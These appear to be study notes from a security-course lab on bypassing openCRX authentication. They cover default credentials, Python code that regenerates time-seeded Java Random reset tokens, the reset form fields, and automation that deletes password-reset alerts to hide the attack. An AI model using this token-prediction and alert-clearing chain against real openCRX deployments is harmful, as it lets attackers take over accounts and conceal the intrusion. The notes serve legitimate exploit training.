# Authentication Bypass

We’ve found a potential attack vector: Since the random values used to generate the `resetToken` are deterministic, if we can analyze and discover the seed (`currentTimeMilis`), we’ll be able to generate the reset token and use it to bypass authentication. 

## Default Accounts

By default, openCRX has 3 accounts with the following credential pairs:

1. guest/guest
2. admin-Standard/admin-Standard
3. admin-Root/admin-Root

## Timing Reset Request

In order to generate the token, we need to guess the seed value, the exact millisecond that the token was generated. Since `systme.currentTimeMilis()` is in UTC, we don’t need to worry about time zone differences. 

We’ll implement code that gets the current mili time, performs the password reset and then gets the current mili time again. Between this, we have about 4-500 different potential values of the seed. Since the seed is determined early in the password reset process, it’s likely the seed lies close to the lower value of our range. 

- The `date` header of our request can also be used to perform a rough sanity check, and since the values are close enough, we can proceed with the attack.

## Generating token list

Once we have the range of potential random seeds, we need to create our own token generator. 

- We can either use a Java script to do it, or view the Java documentation and re-implement this within Python
- Java source code: [Source for java.util.Random (GNU Classpath 0.95 Documentation)](https://developer.classpath.org/doc/java/util/Random-source.html)

```python
class JavaRandom():
	"""docstring for JavaRandom"""
	def __init__(self, seed):
		self.seed = (seed ^ 25214903917) & ((1<<48) -1)
		
	def next(self, bits):
		# print((self.seed * 25214903917 + 11))
		self.seed = (self.seed * 25214903917 + 11) & ((1<<48) -1)
		# print(self.seed)
		return int(self.seed >> (48 - bits))

	# Returns value from [0,n)
	def nextInt(self, n):
		bits = 0
		val = 0
		while True:
			bits = self.next(31)
			val = bits % n
			if (bits - val + (n-1) >= 0): 
				return val

	def generate_token(self, length):
		alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		s = ""
		for i in range(length):
			x = self.nextInt(62)
			s += alphabet[x]
		return s

def generate_tokens(low, high):
	length = 40
	for i in range(low, high):
		rand = JavaRandom(i)
		print(rand.generate_token(length))
```

## Automating resets

During our vulnerability discovery, we found a reset link created. We’ve already discovered the `resetToken`, so we now need the values of the `providerName`, `segmentName` and `principalName`. 

```java
String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
```

Within the `requestPasswordReset.jsp` entry point, we find an input field that assigns the input field for `id` a placeholder value of `guest@CRX/Standard`. However, this isn’t the value that’s assigned to us in the front-end HTML. The value `CRX` has been replaced with `ProviderName` and the value `Standard` has been replaced with `SegmentName`. This suggests that we can try these values in our attack (these value mappings are also seen in `WizardInvoker.jsp`)

```html
Source code:
<input type="text" name="id" id="id" autofocus="" placeholder="ID (e.g. guest@CRX/Standard)" class="form-control" />

Front-end"
<input type="text" name="id" id="id" autofocus="" placeholder="e-mail address, login or ID (e.g. guest@ProviderName/SegmentName)" class="form-control">
```

We can refer to `passwordResetConfirm.jsp` to view the format of the form that we want to emulate in our request. We’ll need the values t (resetToken), p (providerName), s (segmentName), id, password1 and password2 for password verification. 

```html
<form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="PasswordResetConfirm.jsp" accept-charset="UTF-8">
	<h2 class="form-signin-heading">Reset password for <%= id %>@<%= providerName + "/" + segmentName %></h2>					
<input type="hidden" name="t" value="<%= resetToken %>" />
<input type="hidden" name="p" value="<%= providerName %>" />
<input type="hidden" name="s" value="<%= segmentName %>" />
<input type="hidden" name="id" value="<%= id %>" />
<input type="password" name="password1" autofocus="" placeholder="Password" class="form-control" />
<input type="password" name="password2" placeholder="Password (verify)" class="form-control" />
<br />
<button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
<br />
	<%@ include file="password-reset-confirm-note.html" %>					
</form>
```

## Extra Mile 9.2.5.3

Automate the entire password reset attack chain, including the deletion of any password reset
alerts that are generated.

The HTTP request that contains the notifications information is as follows:

```html
Request: 
GET /opencrx-core-CRX/ObjectInspectorServlet?requestId=3T7YDPZOE92B3IMBMG29SCXBN&event=15&parameter=pane*(0)*reference*(0)*referenceName*(alert) HTTP/1.1

Response (part of it):
td><table id="gm"><tr><td><a href="#" onmouseover="javascript:this.href='./'+getEncodedHRef(['ObjectInspectorServlet', 'requestId', 'R3PIMQW880KXBIMBMG29SCXBN', 'event', '6', 'parameter', 'xri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard/alert/3T7YDY7N15ALRIMBMG29SCXBN)*origin*(0)']);onmouseover=function(){};"><img src="./images/Alert.gif" border="0" align="bottom" alt="o" title="" /></a></td><td><div id="G_0_0_row31_menu" class="gridMenu" onclick="try{this.parentNode.parentNode.onclick();}catch(e){};"><div class="gridMenuIndicator" onclick="javascript:jQuery.ajax({type: 'get', url: './'+getEncodedHRef(['ObjectInspectorServlet', 'requestId', 'R3PIMQW880KXBIMBMG29SCXBN', 'event', '44', 'parameter', 'targetXri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard/alert/3T7YDY7N15ALRIMBMG29SCXBN)*rowId*(G_0_0_row31)']), dataType: 'html', success: function(data){$('G_0_0_row31_menu').innerHTML=data;evalScripts(data);}});"><img border="0" height="16" width="16" alt="" src="./images/spacer.gif" /></div><img border="0" align="bottom" alt="" src="./images/menu_down.gif" style="display:none;" /></div></td></tr></table></td>
```

We can use our initial login request response to obtain our session’s requestId, then use that value to simulate this request. Once we’ve done so, we can use regex to search for the alertId of the notifications. 

After doing so, we can then simulate the form-data to clear the notifications (Refer [here](https://stackoverflow.com/questions/12385179/how-to-send-a-multipart-form-data-with-requests-in-python) for Python Request’s Form usage, using the `form` tag with tuples of `(None, data)`).

```python
data = {
		"requestId.submit": (None, requestId),
		"reference": (None, 0),
		"pane": (None, 0),
		"size": (None, ""),
		"event.submit": (None, 28),
		"parameter.list": (None, parameterList)
	}

	target = f"http://{ip}:8080/opencrx-core-CRX/ObjectInspectorServlet"
	r = s.post(target, files=data)
	print("Cleared notifications")
```